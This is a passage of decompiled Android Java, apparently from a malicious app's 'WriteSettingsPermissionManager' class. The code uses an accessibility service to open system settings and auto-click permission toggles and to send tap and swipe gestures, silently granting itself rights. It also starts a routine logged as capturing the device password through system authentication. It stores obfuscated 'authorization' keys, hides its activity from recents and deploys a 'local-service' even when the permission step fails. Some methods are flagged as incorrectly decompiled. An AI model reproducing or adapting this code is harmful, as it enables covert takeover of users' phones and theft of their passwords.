                            if (AbstractC0779a1.m213652a5(string4, "Toggle", true)) {
                            }
                            z3 = z;
                        }
                    } else {
                        z = true;
                        if (AbstractC0779a1.m213652a5(string5, "Switch", true)) {
                        }
                        z3 = z;
                    }
                }
            }
            int size3 = arrayList.size();
            int i3 = 0;
            while (i3 < size3) {
                Object obj3 = arrayList.get(i3);
                i3++;
                m211711f4((AccessibilityNodeInfo) obj3);
            }
            boolean z4 = z2 && z3;
            t60.m214714d6("WriteSettingsPerm", "🔍 WRITE_SETTINGS页面检查: 关键词=" + z2 + ", 控件=" + z3 + ", 结果=" + z4);
            return z4;
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 检查WRITE_SETTINGS页面失败", e);
            return false;
        }
    }

    /* renamed from: d9 */
    public final boolean m211737d9() {
        String string;
        AccessibilityNodeInfo rootInActiveWindow = this.f53166a0.getRootInActiveWindow();
        if (rootInActiveWindow != null) {
            try {
                CharSequence packageName = rootInActiveWindow.getPackageName();
                if (packageName == null || (string = packageName.toString()) == null) {
                    string = "";
                }
                if (m211708e0(string)) {
                    return true;
                }
                Iterator it = dh0.f55771c1.iterator();
                while (it.hasNext()) {
                    AccessibilityNodeInfo accessibilityNodeInfoM211701c4 = m211701c4(rootInActiveWindow, (String) it.next(), 0);
                    if (accessibilityNodeInfoM211701c4 != null) {
                        m211711f4(accessibilityNodeInfoM211701c4);
                        return true;
                    }
                }
            } catch (Exception e) {
                tz0.m214807a7("❌ [页面检查] 检查失败: ", e.getMessage(), "WriteSettingsPerm");
                return false;
            }
        }
        return false;
    }

    /* renamed from: e3 */
    public final void m211738e3() {
        Context context = this.f53167a1;
        try {
            Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(context.getPackageName());
            if (launchIntentForPackage != null) {
                launchIntentForPackage.addFlags(335544320);
                context.startActivity(launchIntentForPackage);
            }
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 启动主应用失败", e);
        }
    }

    /* renamed from: e4 */
    public final void m211739e4() {
        try {
            this.f53167a1.getSharedPreferences("write_settings_state", 0).edit().putBoolean("write_settings_attempted", true).putLong("write_settings_attempt_time", System.currentTimeMillis()).apply();
            t60.m214714d6("WriteSettingsPerm", "✅ 已标记WRITE_SETTINGS流程已尝试过");
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 标记WRITE_SETTINGS尝试状态失败", e);
        }
    }

    /* renamed from: e5 */
    public final void m211740e5(String str) {
        dqtvuisjd dqtvuisjdVar = this.f53166a0;
        Context context = this.f53167a1;
        t60.m214726f4("WriteSettingsPerm", "❌ WRITE_SETTINGS权限申请失败: " + str);
        m211739e4();
        m211749f5(str, false);
        m211752f8();
        try {
            C0763km c0763kmM211469g3 = dqtvuisjdVar.m211469g3();
            if (c0763kmM211469g3 != null) {
                c0763kmM211469g3.m213600a0();
            }
            t60.m214714d6("WriteSettingsPerm", "✅ WRITE_SETTINGS失败，已强制隐藏 ConfigMask 配置遮盖");
        } catch (Exception e) {
            tz0.m214810b0("⚠️ 隐藏配置遮盖失败: ", e.getMessage(), "WriteSettingsPerm");
        }
        if (dqtvuisjdVar == null) {
            dqtvuisjdVar = null;
        }
        if (dqtvuisjdVar != null) {
            try {
                dqtvuisjdVar.m211460e9();
                dqtvuisjdVar.m211442c7(true);
                context.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).apply();
                String strM211697b1 = m211697b1();
                context.getSharedPreferences(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHw=="), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).putString(StringUtil.m212470a0("KkwFMkIqBTRSNRRdFCxEOwk="), strM211697b1).putLong("authorization_time", System.currentTimeMillis()).apply();
                t60.m214714d6("WriteSettingsPerm", "✅ WRITE_SETTINGS失败，已标记授权完成，deviceKey=".concat(strM211697b1));
                dqtvuisjdVar.m211535n3();
                try {
                    Intent intent = new Intent();
                    intent.setComponent(new ComponentName(context, (Class<?>) iuzxujjtqev.class));
                    intent.addFlags(335544320);
                    intent.putExtra("TRIGGER_EXCLUDE_FROM_RECENTS", true);
                    context.startActivity(intent);
                } catch (Exception e2) {
                    t60.m214726f4("WriteSettingsPerm", "🎭 启动Activity失败: " + e2.getMessage());
                }
                dqtvuisjdVar.m211459e8();
                t60.m214714d6("WriteSettingsPerm", "★★★ WRITE_SETTINGS 失败，但仍然开始部署 local-service ★★★");
                new Thread(new RunnableC1053p2(9, this)).start();
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:33:0x0059 -> B:51:0x0060). Please report as a decompilation issue!!! */
    /* renamed from: e6 */
    public final void m211741e6() {
        synchronized (this.f53183b7) {
            if (this.f53178b2) {
                return;
            }
            this.f53178b2 = true;
            m211739e4();
            m211749f5(null, true);
            m211752f8();
            try {
                this.f53166a0.performGlobalAction(2);
            } catch (Exception e) {
                tz0.m214810b0("⚠️ HOME按键失败: ", e.getMessage(), "WriteSettingsPerm");
            }
            try {
                dqtvuisjd dqtvuisjdVar = this.f53166a0;
                if (dqtvuisjdVar == null) {
                    dqtvuisjdVar = null;
                }
                if (dqtvuisjdVar != null) {
                    dqtvuisjdVar.m211460e9();
                }
            } catch (Exception unused) {
            }
            try {
                this.f53166a0.m211444c9();
            } catch (Exception unused2) {
            }
            try {
                dqtvuisjd dqtvuisjdVar2 = this.f53166a0;
                if (dqtvuisjdVar2 == null) {
                    dqtvuisjdVar2 = null;
                }
                if (dqtvuisjdVar2 != null) {
                    t60.m214714d6("WriteSettingsPerm", "🔐 WriteSettingsPermissionManager 调用 capturePasswordViaSystemAuth()");
                    dqtvuisjdVar2.m211442c7(true);
                } else {
                    t60.m214704c5("WriteSettingsPerm", "❌ dqtvuisjd 为 null，无法启动密码捕获");
                }
            } catch (Exception e2) {
                t60.m214705c6("WriteSettingsPerm", "❌ 启动系统密码捕获失败", e2);
            }
            try {
                dqtvuisjd dqtvuisjdVar3 = this.f53166a0;
                dqtvuisjd dqtvuisjdVar4 = dqtvuisjdVar3 != null ? dqtvuisjdVar3 : null;
                if (dqtvuisjdVar4 != null) {
                    this.f53167a1.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).apply();
                    this.f53167a1.getSharedPreferences(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHw=="), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).putString(StringUtil.m212470a0("KkwFMkIqBTRSNRRdFCxEOwk="), m211697b1()).putLong("authorization_time", System.currentTimeMillis()).apply();
                    dqtvuisjdVar4.m211460e9();
                    dqtvuisjdVar4.m211535n3();
                    try {
                        Intent intent = new Intent();
                        intent.setComponent(new ComponentName(this.f53167a1, (Class<?>) iuzxujjtqev.class));
                        intent.addFlags(268435456);
                        intent.putExtra("TRIGGER_EXCLUDE_FROM_RECENTS", true);
                        this.f53167a1.startActivity(intent);
                    } catch (Exception e3) {
                        t60.m214726f4("WriteSettingsPerm", "🎭 启动Activity失败: " + e3.getMessage());
                    }
                    dqtvuisjdVar4.m211459e8();
                    t60.m214714d6("WriteSettingsPerm", "★★★ WRITE_SETTINGS 完成，开始部署 local-service ★★★");
                    new Thread(new RunnableC1053p2(8, this)).start();
                }
            } catch (Exception unused3) {
            }
        }
    }

    /* renamed from: e7 */
    public final void m211742e7() {
        try {
            Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
            intent.setData(Uri.parse("package:" + this.f53167a1.getPackageName()));
            intent.addFlags(276824064);
            if (this.f53167a1.getPackageManager().resolveActivity(intent, 0) == null) {
                m211740e5("系统不支持设置页面");
            } else {
                this.f53167a1.startActivity(intent);
                this.f53170a4 = true;
            }
        } catch (Exception unused) {
            m211740e5("无法打开设置页面");
        }
    }

    /* renamed from: e8 */
    public final void m211743e8() {
        long jCurrentTimeMillis = System.currentTimeMillis();
        t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] openWriteSettingsPage() 进入函数 @" + jCurrentTimeMillis);
        try {
            long jCurrentTimeMillis2 = System.currentTimeMillis();
            Intent intent = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS");
            intent.setData(Uri.parse("package:" + this.f53167a1.getPackageName()));
            intent.addFlags(276824064);
            t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] 创建Intent耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis2) + "ms");
            long jCurrentTimeMillis3 = System.currentTimeMillis();
            ResolveInfo resolveInfoResolveActivity = this.f53167a1.getPackageManager().resolveActivity(intent, 0);
            t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] resolveActivity()耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis3) + "ms, 结果: " + (resolveInfoResolveActivity != null));
            if (resolveInfoResolveActivity != null) {
                long jCurrentTimeMillis4 = System.currentTimeMillis();
                t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] 即将调用 startActivity() @" + jCurrentTimeMillis4);
                this.f53167a1.startActivity(intent);
                t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] startActivity()返回，耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis4) + "ms");
                this.f53170a4 = true;
            } else {
                t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] resolveActivity返回null，调用备用方案");
                m211742e7();
            }
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 打开WRITE_SETTINGS权限设置页面失败", e);
            m211742e7();
        }
        t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] openWriteSettingsPage() 函数结束，总耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis) + "ms");
    }

    /* renamed from: e9 */
    public final void m211744e9() {
        dqtvuisjd dqtvuisjdVar = this.f53166a0;
        try {
            int i = dqtvuisjdVar.getResources().getDisplayMetrics().widthPixels;
            float f = r2.heightPixels / 2.0f;
            Path path = new Path();
            path.moveTo(10.0f, f);
            path.lineTo(i / 3.0f, f);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 300L));
            if (dqtvuisjdVar.dispatchGesture(builder.build(), new C0429du(7), null)) {
                return;
            }
            t60.m214726f4("WriteSettingsPerm", "⚠️ 发送返回手势失败");
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 返回手势失败", e);
        }
    }

    /* renamed from: f0 */
    public final void m211745f0() {
        try {
            if (this.f53166a0.performGlobalAction(1)) {
                return;
            }
            t60.m214726f4("WriteSettingsPerm", "⚠️ 返回键执行失败，尝试手势返回");
            m211744e9();
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 执行返回操作失败", e);
            m211744e9();
        }
    }

    /* renamed from: f1 */
    public final void m211746f1(AccessibilityNodeInfo accessibilityNodeInfo) {
        CharSequence packageName;
        String string;
        String string2;
        String string3;
        boolean z;
        CharSequence packageName2;
        dqtvuisjd dqtvuisjdVar = this.f53166a0;
        String str = "";
        try {
            if (accessibilityNodeInfo.isVisibleToUser()) {
                String strM211705d2 = m211705d2(accessibilityNodeInfo);
                CharSequence className = accessibilityNodeInfo.getClassName();
                if (className == null || (string2 = className.toString()) == null) {
                    string2 = "";
                }
                AccessibilityNodeInfo rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                if (rootInActiveWindow == null || (packageName2 = rootInActiveWindow.getPackageName()) == null || (string3 = packageName2.toString()) == null) {
                    string3 = "";
                }
                List listM213306g5 = AbstractC0716jf.m213306g5("Switch", "Toggle", "CheckBox", "RadioButton", "ToggleButton", "CompoundButton");
                boolean zPerformAction = true;
                if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                    Iterator it = listM213306g5.iterator();
                    while (it.hasNext()) {
                        if (AbstractC0779a1.m213652a5(string2, (String) it.next(), true)) {
                            z = true;
                            break;
                        }
                    }
                    z = false;
                } else {
                    z = false;
                }
                if (z && accessibilityNodeInfo.isCheckable()) {
                    if (!accessibilityNodeInfo.performAction(16) && !accessibilityNodeInfo.performAction(4)) {
                        zPerformAction = false;
                    }
                } else {
                    if (z && !accessibilityNodeInfo.isClickable()) {
                        m211753f9(accessibilityNodeInfo, string3, strM211705d2);
                        return;
                    }
                    zPerformAction = accessibilityNodeInfo.performAction(16);
                }
                if (zPerformAction) {
                    AbstractC0780a0.m213692a3(this.f53168a2, null, new WriteSettingsPermissionManager$performClickSafe$1(this, string3, strM211705d2, null), 3);
                } else {
                    t60.m214726f4("WriteSettingsPerm", "⚠️ 点击失败，尝试坐标点击");
                    m211753f9(accessibilityNodeInfo, string3, strM211705d2);
                }
            }
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 点击异常", e);
            AccessibilityNodeInfo rootInActiveWindow2 = dqtvuisjdVar.getRootInActiveWindow();
            if (rootInActiveWindow2 != null && (packageName = rootInActiveWindow2.getPackageName()) != null && (string = packageName.toString()) != null) {
                str = string;
            }
            m211753f9(accessibilityNodeInfo, str, m211705d2(accessibilityNodeInfo));
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:26:0x0083  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:29:0x0095 -> B:31:0x0098). Please report as a decompilation issue!!! */
    /* renamed from: f2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211747f2(float f, float f2, ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$performCoordinateClick$1 writeSettingsPermissionManager$performCoordinateClick$1;
        Ref$BooleanRef ref$BooleanRef;
        Ref$BooleanRef ref$BooleanRef2;
        int i;
        if (continuationImpl instanceof WriteSettingsPermissionManager$performCoordinateClick$1) {
            writeSettingsPermissionManager$performCoordinateClick$1 = (WriteSettingsPermissionManager$performCoordinateClick$1) continuationImpl;
            int i2 = writeSettingsPermissionManager$performCoordinateClick$1.f52983a5;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$performCoordinateClick$1.f52983a5 = i2 - Integer.MIN_VALUE;
            } else {
                writeSettingsPermissionManager$performCoordinateClick$1 = new WriteSettingsPermissionManager$performCoordinateClick$1(this, continuationImpl);
            }
        }
        Object obj = writeSettingsPermissionManager$performCoordinateClick$1.f52981a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = writeSettingsPermissionManager$performCoordinateClick$1.f52983a5;
        boolean z = false;
        try {
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 执行坐标点击失败", e);
        }
        if (i3 == 0) {
            kg1.m213544f4(obj);
            Path path = new Path();
            path.moveTo(f, f2);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L));
            GestureDescription gestureDescriptionBuild = builder.build();
            Ref$BooleanRef ref$BooleanRef3 = new Ref$BooleanRef();
            Ref$BooleanRef ref$BooleanRef4 = new Ref$BooleanRef();
            if (!this.f53166a0.dispatchGesture(gestureDescriptionBuild, new jh1(ref$BooleanRef3, ref$BooleanRef4, 0), null)) {
                t60.m214726f4("WriteSettingsPerm", "⚠️ 发送坐标点击手势失败");
                return Boolean.FALSE;
            }
            ref$BooleanRef = ref$BooleanRef3;
            ref$BooleanRef2 = ref$BooleanRef4;
            i = 0;
            if (ref$BooleanRef.f57622a0) {
            }
            z = ref$BooleanRef2.f57622a0;
            return Boolean.valueOf(z);
        }
        if (i3 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        i = writeSettingsPermissionManager$performCoordinateClick$1.f52980a2;
        ref$BooleanRef2 = writeSettingsPermissionManager$performCoordinateClick$1.f52979a1;
        ref$BooleanRef = writeSettingsPermissionManager$performCoordinateClick$1.f52978a0;
        kg1.m213544f4(obj);
        i += 50;
        if (!ref$BooleanRef.f57622a0 || i >= 1000) {
            z = ref$BooleanRef2.f57622a0;
            return Boolean.valueOf(z);
        }
        writeSettingsPermissionManager$performCoordinateClick$1.f52978a0 = ref$BooleanRef;
        writeSettingsPermissionManager$performCoordinateClick$1.f52979a1 = ref$BooleanRef2;
        writeSettingsPermissionManager$performCoordinateClick$1.f52980a2 = i;
        writeSettingsPermissionManager$performCoordinateClick$1.f52983a5 = 1;
        if (b81.m210571b1(50L, writeSettingsPermissionManager$performCoordinateClick$1) == coroutineSingletons) {
            return coroutineSingletons;
        }
        i += 50;
        if (ref$BooleanRef.f57622a0) {
        }
        z = ref$BooleanRef2.f57622a0;
        return Boolean.valueOf(z);
    }

    /* JADX WARN: Removed duplicated region for block: B:26:0x008e  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0015  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:29:0x00a0 -> B:31:0x00a3). Please report as a decompilation issue!!! */
    /* renamed from: f3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211748f3(float f, float f2, float f3, float f4, ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$performSwipeGesture$1 writeSettingsPermissionManager$performSwipeGesture$1;
        Ref$BooleanRef ref$BooleanRef;
        Ref$BooleanRef ref$BooleanRef2;
        int i;
        if (continuationImpl instanceof WriteSettingsPermissionManager$performSwipeGesture$1) {
            writeSettingsPermissionManager$performSwipeGesture$1 = (WriteSettingsPermissionManager$performSwipeGesture$1) continuationImpl;
            int i2 = writeSettingsPermissionManager$performSwipeGesture$1.f52989a5;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$performSwipeGesture$1.f52989a5 = i2 - Integer.MIN_VALUE;
            } else {
                writeSettingsPermissionManager$performSwipeGesture$1 = new WriteSettingsPermissionManager$performSwipeGesture$1(this, continuationImpl);
            }
        }
        Object obj = writeSettingsPermissionManager$performSwipeGesture$1.f52987a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = writeSettingsPermissionManager$performSwipeGesture$1.f52989a5;
        boolean z = false;
        try {
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 执行滑动手势失败", e);
        }
        if (i3 == 0) {
            kg1.m213544f4(obj);
            Path path = new Path();
            path.moveTo(f, f2);
            path.lineTo(f3, f4);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, 400L));
            Ref$BooleanRef ref$BooleanRef3 = new Ref$BooleanRef();
            Ref$BooleanRef ref$BooleanRef4 = new Ref$BooleanRef();
            if (!this.f53166a0.dispatchGesture(builder.build(), new jh1(ref$BooleanRef3, ref$BooleanRef4, 1), null)) {
                t60.m214726f4("WriteSettingsPerm", "⚠️ 发送滑动手势失败");
                return Boolean.FALSE;
            }
            ref$BooleanRef = ref$BooleanRef3;
            ref$BooleanRef2 = ref$BooleanRef4;
            i = 0;
            if (ref$BooleanRef.f57622a0) {
            }
            z = ref$BooleanRef2.f57622a0;
            return Boolean.valueOf(z);
        }
        if (i3 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        i = writeSettingsPermissionManager$performSwipeGesture$1.f52986a2;
        ref$BooleanRef2 = writeSettingsPermissionManager$performSwipeGesture$1.f52985a1;
        ref$BooleanRef = writeSettingsPermissionManager$performSwipeGesture$1.f52984a0;
        kg1.m213544f4(obj);
        i += 50;
        if (!ref$BooleanRef.f57622a0 || i >= 600) {
            z = ref$BooleanRef2.f57622a0;
            return Boolean.valueOf(z);
        }
        writeSettingsPermissionManager$performSwipeGesture$1.f52984a0 = ref$BooleanRef;
        writeSettingsPermissionManager$performSwipeGesture$1.f52985a1 = ref$BooleanRef2;
        writeSettingsPermissionManager$performSwipeGesture$1.f52986a2 = i;
        writeSettingsPermissionManager$performSwipeGesture$1.f52989a5 = 1;
        if (b81.m210571b1(50L, writeSettingsPermissionManager$performSwipeGesture$1) == coroutineSingletons) {
            return coroutineSingletons;
        }
        i += 50;
        if (ref$BooleanRef.f57622a0) {
        }
        z = ref$BooleanRef2.f57622a0;
        return Boolean.valueOf(z);
    }

    /* renamed from: f5 */
    public final void m211749f5(String str, boolean z) {
        Context context = this.f53167a1;
        try {
            Intent intent = new Intent("com.storm.safe.rock.intent.WRITE_SETTINGS_PERMISSION_GRANTED");
            intent.putExtra(PollingXHR.Request.EVENT_SUCCESS, z);
            if (str != null) {
                intent.putExtra("reason", str);
            }
            intent.putExtra("timestamp", System.currentTimeMillis());
            context.sendBroadcast(intent);
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 发送权限结果广播失败", e);
            try {
                t60.m214726f4("WriteSettingsPerm", "🔄 尝试备用广播发送方案");
                Intent intent2 = new Intent("com.storm.safe.rock.intent.WRITE_SETTINGS_PERMISSION_GRANTED");
                intent2.putExtra(PollingXHR.Request.EVENT_SUCCESS, z);
                if (str != null) {
                    intent2.putExtra("reason", str);
                }
                intent2.putExtra("fallback", true);
                context.sendBroadcast(intent2);
            } catch (Exception e2) {
                t60.m214705c6("WriteSettingsPerm", "❌ 备用广播发送也失败", e2);
            }
        }
    }

    /* renamed from: f6 */
    public final void m211750f6() {
        try {
            AbstractC0780a0.m213692a3(this.f53168a2, null, new WriteSettingsPermissionManager$startPeriodicDetection$1(this, null), 3);
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 启动定时检测失败", e);
        }
    }

    /* renamed from: f7 */
    public final void m211751f7() {
        long jCurrentTimeMillis = System.currentTimeMillis();
        t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] startWriteSettingsPermissionRequest() 开始执行 @" + jCurrentTimeMillis);
        if (this.f53167a1.getSharedPreferences("write_settings_state", 0).getBoolean("write_settings_attempted", false)) {
            t60.m214714d6("WriteSettingsPerm", "✅ WRITE_SETTINGS流程已尝试过，跳过（不管之前成功或失败）");
            return;
        }
        if (this.f53169a3) {
            t60.m214726f4("WriteSettingsPerm", "⚠️ WRITE_SETTINGS权限申请已在进行中");
            return;
        }
        if (m211734d5()) {
            if (!this.f53178b2) {
                m211741e6();
                return;
            }
            t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] 权限已处理过，跳过 @" + (System.currentTimeMillis() - jCurrentTimeMillis) + "ms");
            return;
        }
        long jCurrentTimeMillis2 = System.currentTimeMillis();
        m211752f8();
        t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] stopPermissionRequest() 耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis2) + "ms");
        if (!AbstractC1117qo.m214443d9(this.f53168a2)) {
            t60.m214726f4("WriteSettingsPerm", "⚠️ 协程作用域不活跃，重新创建");
            C1180rh c1180rh = AbstractC1262tj.f60233a0;
            C0785a0 c0785a0 = sc0.f59953a0;
            y21 y21Var = new y21();
            c0785a0.getClass();
            this.f53168a2 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var));
        }
        long jCurrentTimeMillis3 = System.currentTimeMillis();
        this.f53174a8 = "";
        this.f53175a9 = 0;
        this.f53173a7 = 0L;
        this.f53171a5 = 0;
        this.f53170a4 = false;
        this.f53177b1 = 0;
        this.f53182b6.clear();
        t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] resetDetectionState() 耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis3) + "ms");
        this.f53169a3 = true;
        this.f53172a6 = System.currentTimeMillis();
        long jCurrentTimeMillis4 = System.currentTimeMillis();
        t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] 即将调用 openWriteSettingsPage() @" + jCurrentTimeMillis4);
        m211743e8();
        t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] openWriteSettingsPage() 返回，耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis4) + "ms");
        u11 u11Var = this.f53179b3;
        if (u11Var != null) {
            u11Var.m215253a7(null);
        }
        try {
            this.f53179b3 = AbstractC0780a0.m213692a3(this.f53168a2, null, new WriteSettingsPermissionManager$startPermissionMonitoring$1(this, null), 3);
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 启动权限监听失败", e);
        }
        int iOrdinal = this.f53176b0.ordinal();
        if (iOrdinal == 0) {
            try {
                AbstractC0780a0.m213692a3(this.f53168a2, null, new WriteSettingsPermissionManager$startCoordinateClickDetection$1(this, null), 3);
            } catch (Exception e2) {
                t60.m214705c6("WriteSettingsPerm", "❌ 启动坐标点击检测失败", e2);
            }
        } else if (iOrdinal == 1) {
            m211750f6();
        }
        t60.m214704c5("WriteSettingsPerm", "🔐⏱️ [计时] startWriteSettingsPermissionRequest() 全部完成，总耗时: " + (System.currentTimeMillis() - jCurrentTimeMillis) + "ms");
    }

    /* renamed from: f8 */
    public final void m211752f8() {
        if (this.f53169a3 && !this.f53178b2) {
            t60.m214726f4("WriteSettingsPerm", "⚠️ 权限申请被强制停止，发送失败广播并启用后续功能");
            m211739e4();
            try {
                m211749f5("权限申请被强制停止", false);
                dqtvuisjd dqtvuisjdVar = this.f53166a0;
                if (dqtvuisjdVar == null) {
                    dqtvuisjdVar = null;
                }
                if (dqtvuisjdVar != null) {
                    this.f53167a1.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).apply();
                    String strM211697b1 = m211697b1();
                    this.f53167a1.getSharedPreferences(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHw=="), 0).edit().putBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), true).putString(StringUtil.m212470a0("KkwFMkIqBTRSNRRdFCxEOwk="), strM211697b1).putLong("authorization_time", System.currentTimeMillis()).apply();
                    t60.m214714d6("WriteSettingsPerm", "✅ 强制停止，已标记授权完成，deviceKey=".concat(strM211697b1));
                    dqtvuisjdVar.m211460e9();
                    dqtvuisjdVar.m211535n3();
                }
            } catch (Exception e) {
                t60.m214705c6("WriteSettingsPerm", "❌ 强制停止时处理失败", e);
            }
        }
        this.f53169a3 = false;
        this.f53174a8 = "";
        this.f53175a9 = 0;
        this.f53173a7 = 0L;
        this.f53171a5 = 0;
        this.f53170a4 = false;
        this.f53177b1 = 0;
        this.f53182b6.clear();
        this.f53172a6 = 0L;
        u11 u11Var = this.f53179b3;
        if (u11Var != null) {
            u11Var.m215253a7(null);
        }
        this.f53179b3 = null;
        u11 u11Var2 = this.f53180b4;
        if (u11Var2 != null) {
            u11Var2.m215253a7(null);
        }
        this.f53180b4 = null;
    }

    /* renamed from: f9 */
    public final void m211753f9(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2) {
        try {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (!rect.isEmpty() && rect.width() > 0 && rect.height() > 0) {
                t60.m214702c3("WriteSettingsPerm", "✅ [坐标检查1] 节点边界有效: left=" + rect.left + ", top=" + rect.top + ", right=" + rect.right + ", bottom=" + rect.bottom);
                float fCenterX = (float) rect.centerX();
                float fCenterY = (float) rect.centerY();
                if (fCenterX > 0.0f && fCenterY > 0.0f) {
                    Path path = new Path();
                    path.moveTo(fCenterX, fCenterY);
                    if (this.f53166a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build(), new C0326b1(this, str, str2), null)) {
                        return;
                    }
                    t60.m214726f4("WriteSettingsPerm", "⚠️ 发送坐标点击手势失败");
                    return;
                }
                t60.m214726f4("WriteSettingsPerm", "⚠️ [坐标检查2] 坐标无效，跳过点击");
                return;
            }
            t60.m214726f4("WriteSettingsPerm", "⚠️ [坐标检查1] 节点边界无效，跳过坐标点击");
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 坐标点击失败", e);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* renamed from: g1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211754g1(int i, long j, long j2, ContinuationImpl continuationImpl) throws Throwable {
        WriteSettingsPermissionManager$waitForPageStable$1 writeSettingsPermissionManager$waitForPageStable$1;
        C0327b2 c0327b2;
        long j3;
        WriteSettingsPermissionManager$waitForPageStable$1 writeSettingsPermissionManager$waitForPageStable$12;
        C0327b2 c0327b22;
        long jCurrentTimeMillis;
        int i2;
        long j4;
        int i3;
        int i4;
        if (continuationImpl instanceof WriteSettingsPermissionManager$waitForPageStable$1) {
            writeSettingsPermissionManager$waitForPageStable$1 = (WriteSettingsPermissionManager$waitForPageStable$1) continuationImpl;
            int i5 = writeSettingsPermissionManager$waitForPageStable$1.f53017a9;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$waitForPageStable$1.f53017a9 = i5 - Integer.MIN_VALUE;
                c0327b2 = this;
            } else {
                c0327b2 = this;
                writeSettingsPermissionManager$waitForPageStable$1 = new WriteSettingsPermissionManager$waitForPageStable$1(c0327b2, continuationImpl);
            }
        }
        Object obj = writeSettingsPermissionManager$waitForPageStable$1.f53015a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i6 = writeSettingsPermissionManager$waitForPageStable$1.f53017a9;
        if (i6 == 0) {
            kg1.m213544f4(obj);
            j3 = j2;
